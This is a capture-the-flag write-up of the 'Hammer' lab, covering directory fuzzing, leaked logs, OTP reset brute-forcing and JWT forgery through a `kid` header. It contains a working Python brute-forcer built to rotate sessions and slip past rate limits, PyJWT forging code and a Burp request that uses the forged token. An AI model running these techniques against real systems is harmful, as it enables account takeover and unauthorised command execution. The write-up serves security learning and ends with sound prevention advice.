---
title: Hammer
difficulty: Medium
environment: Web
tags:
  - Apache
  - ffuf
  - OTP
  - JWT
  - Brute Force
  - Auth Bypass
  - RCE
  - Burp
  - Web
image: "https://cards.scryfall.io/art_crop/front/c/4/c4c2c914-e9a7-450b-88d9-8885fe0f6643.jpg?1675957081"
image_alt: "Essence Channeler art"
date: 2026-02-21
---

## Overview

Hammer is a medium web challenge that chains together weak account recovery (a 4-digit OTP), information leakage through exposed log files, and JWT abuse via a controllable `kid` value to escalate from a normal user to an admin capable of command execution.

## Reconnaissance

### Nmap Scan

```
$ nmap -p- --min-rate 1000 -Pn 10.10.11.xx
PORT     STATE SERVICE
1337/tcp open  waste
```

```
$ nmap -sCV -p 1337 -oN nmap/hammer 10.10.11.xx
```

The web app is served over HTTP on port 1337.

### Directory Enumeration

The landing page source contained a helpful comment:

```html
<!-- Dev Note: Directory naming convention must be hmr_DIRECTORY_NAME -->
```

With that hint, I fuzzed directories using `ffuf`:

```bash
ffuf -u http://10.10.118.103:1337/hmr_FUZZ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -mc 200,301
```

This reveals `/hmr_logs` which contains `error.logs` (Apache error logs). Inside was a valid email address:

- `tester@hammer.thm`

Before finding the email in logs, I checked whether the login page allowed username enumeration. It did not — the error message is static:

> "user OR password is wrong"

## Exploitation

### Initial Access

With a valid email address from the exposed logs, the next step is the password reset flow at:

- `/reset_password.php`

The reset mechanism relies on a **4-digit OTP** (0000–9999). Even with basic session/rate controls, it’s still brute-forceable by rotating sessions and pacing requests.

Script used (`OTP_pin_brute.py`):

```python
import requests
import itertools
import time
import random
from datetime import datetime

BASE_URL = "http://10.67.172.249:1337"
RESET_ENDPOINT = "/reset_password.php"

EMAIL = "tester@hammer.thm"
CODE_LENGTH = 4

# Rate control
REQUEST_DELAY = (0.8, 1.5)      # hotspot‑safe
SESSION_ROTATE_DELAY = 2.5

def log(msg):
  ts = datetime.now().strftime("%H:%M:%S")
  print(f"[{ts}] {msg}")

def start_new_session():
  session = requests.Session()

  # Initial page hit → PHPSESSID
  session.get(BASE_URL + RESET_ENDPOINT)

  # Trigger email / OTP generation
  session.post(
    BASE_URL + RESET_ENDPOINT,
    data={"email": EMAIL},
    allow_redirects=True
  )

  sid = session.cookies.get("PHPSESSID")
  log(f"[NEW SESSION] PHPSESSID={sid}")

  return session, sid

def is_real_success(response):
  """
  Define success as:
  - recovery form no longer present
  OR
  - new password form present
  """

  text = response.text.lower()

  if "enter recovery code" not in text:
    return True

  if "new password" in text and "recovery code" not in text:
    return True

  return False

def brute_force():
  codes = (
    "".join(code)
    for code in itertools.product("0123456789", repeat=CODE_LENGTH)
  )

  session, current_sid = start_new_session()

  for code in codes:
    log(f"Trying code {code} | SID={current_sid}")

    response = session.post(
      BASE_URL + RESET_ENDPOINT,
      data={"recovery_code": code},
      allow_redirects=True
    )

    # Detect PHPSESSID rotation
    new_sid = session.cookies.get("PHPSESSID")
    if new_sid != current_sid:
      log(f"[SID ROTATION] {current_sid} → {new_sid}")
      current_sid = new_sid

    # Read server rate‑limit if present
    remaining = response.headers.get("Rate-Limit-Pending")
    if remaining is not None:
      log(f"Attempts left in session: {remaining}")

    # REAL success check
    if is_real_success(response):
      log("OTP ACCEPTED")
      log(f"VALID CODE: {code}")
      log(f"FINAL PHPSESSID: {current_sid}")
      log(f"FINAL URL: {response.url}")

      # Optional: dump page title snippet
      title_start = response.text.lower().find("<title>")
      title_end = response.text.lower().find("</title>")
      if title_start != -1 and title_end != -1:
        log(f"PAGE TITLE: {response.text[title_start+7:title_end]}")

      return

    # Rotate session if rate‑limited
    if remaining is not None and int(remaining) <= 0:
      log("Rate limit hit → rotating session")
      session.close()
      time.sleep(SESSION_ROTATE_DELAY)
      session, current_sid = start_new_session()
      continue

    time.sleep(random.uniform(*REQUEST_DELAY))

  log("All combinations exhausted")

if __name__ == "__main__":
  brute_force()
```

What this script does (and why it works):

- Creates a fresh session (`requests.Session`) to obtain a `PHPSESSID`.
- Triggers OTP generation for the target email.
- Iterates through all 4-digit codes while sleeping between requests to avoid tripping basic defenses.
- Detects session rotation and watches the server’s `Rate-Limit-Pending` header (when present).
- If rate limited, it rotates to a new session and continues.
- Detects success by checking page content (recovery form disappears / new password form appears) rather than relying only on status codes.

After the OTP is accepted and the password is reset, I logged in as the user. It drops you on `/execute_command.php` which contains a command input box.

The command execution is very restricted: `ls` works and lists directory contents, but most other commands (like `cat`) are blocked. The app also auto-logins you again after a short time.

### Privilege Escalation & RCE

After logging in, the app issues a JWT containing a claim like `role: user`. The JWT header includes a `kid` value that points at a file path.

I inspected and modified the token using `jwt.io` (you can also do this programmatically with PyJWT).

From the command box, running `ls` revealed a signing key file in the web root:

- `188ade1.key`

Because it’s in the web root, it’s directly downloadable:

- `http://hammer.thm/188ade1.key`

Key contents (`adekey`):

```
56058354efb3daa97ebab00fabd7a7d7
```

With that key, we can forge a new JWT:

- In the **payload**, change `role` to `admin`
- In the **header**, set `kid` to the discovered key path/name
- Sign the token with the downloaded key

Example forging with PyJWT:

```python
import jwt

KEY = open("188ade1.key", "rb").read()
payload = {"role": "admin"}
headers = {"kid": "188ade1.key"}

token = jwt.encode(payload, KEY, algorithm="HS256", headers=headers)
print(token)
```

Finally, I sent the forged token in Burp by adding an Authorization header when posting to the command endpoint:

```http
POST /execute_command.php HTTP/1.1
Host: hammer.thm
Authorization: Bearer <FORGED_JWT_HERE>
Content-Type: application/x-www-form-urlencoded

command=id
```

With the admin JWT, the endpoint returns the flag and the lab is complete.

## Flags

- **User:** `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`
- **Root:** `xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx`

## Lessons Learned

Rate limiting and lockouts matter for any OTP-based recovery flow. Additionally, JWT `kid` handling should never allow attacker-controlled filesystem lookups, and secrets/signing keys should not be discoverable from within application features.

## JWT primer (short)

A JWT is three Base64URL-encoded parts separated by dots:

`header.payload.signature`

- **Header**: metadata like the signing algorithm (`alg`) and token type (`typ`). In this box it also included a dangerous `kid` header that the server treated like a file path.
- **Payload**: claims (e.g., `role: user`, `exp`, `iat`, `iss`, `aud`).
- **Signature**: proves the token was signed by the server’s key/secret.

Example forged JWT used in this lab:

```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii92YXIvd3d3L2h0bWwvMTg4YWRlMS5rZXkifQ.eyJpc3MiOiJodHRwOi8vaGFtbWVyLnRobSIsImF1ZCI6Imh0dHA6Ly9oYW1tZXIudGhtIiwiaWF0IjoxNzcwNTg0MDIzLCJleHAiOjE3NzA1ODc2MjMsImRhdGEiOnsidXNlcl9pZCI6MSwiZW1haWwiOiJ0ZXN0ZXJAaGFtbWVyLnRobSIsInJvbGUiOiJhZG1pbiJ9fQ.3cm0ELDW_cOvXgbJkwh94XZPG7APVRECxWCEkjV9P0A
```

## How this should have been prevented

Built-in JWT library validation + common best practices would have stopped this chain:

- **Never load signing keys from attacker-controlled `kid` values**. Use a server-side allowlist/map (`kid` → key) or ignore `kid` entirely.
- **Store signing secrets outside web root** and outside any feature that can list/download files.
- **Enforce algorithm expectations** by pinning `alg` server-side and rejecting `none`.
- **Validate required claims** (`exp`, `iss`, `aud`) and reject tokens that don’t match expectations.
- **Rate-limit/lock out OTP verification** per account and per IP, and invalidate OTPs after a small number of attempts.

I recommend visiting this room in TryHackMe, that goes into JWT security in detail: https://tryhackme.com/room/jwtsecurity
